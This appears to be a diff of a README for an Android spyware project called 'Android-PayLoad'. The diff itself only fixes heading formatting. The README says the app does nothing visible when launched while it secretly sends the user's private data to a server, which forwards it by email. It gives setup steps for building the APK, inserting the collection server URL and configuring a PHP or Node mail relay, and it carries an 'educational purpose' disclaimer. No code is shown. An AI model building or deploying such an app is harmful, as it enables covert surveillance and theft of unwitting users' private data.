@@ -1,12 +1,12 @@
 # Android-PayLoad
 This app does nothing when launched.. It secretely sends private data of the user to a server and then from server to email... Only for educational purpose.. Email is sent using PHPMailer.. https://github.com/PHPMailer/PHPMailer. 
 
-#Instruction
+# Instruction
 
 The client (android app) does not require any setup. Just make the apk using Android Studio and add the server url in client/app/src/main/java/com/ankit/serverconnect/ConnectionService.java in line 77.<br>
 The server is written on two platforms (PHP and Node) you can use either of them.<br>
 
-#PHP
+# PHP
 
 For setting PHP server you need PHP Mailer:<br>
 1) Make the folder server/PHP/phpmailer.<br>
@@ -14,7 +14,7 @@ For setting PHP server you need PHP Mailer:<br>
 3) Enter the sender and reciever emails and sender password and other details in email.php.<br>
 4) It's all setup now host the php files and done.<br>
 
-#Node
+# Node
 
 For setting Node server:<br>
 1) run npm update.<br>
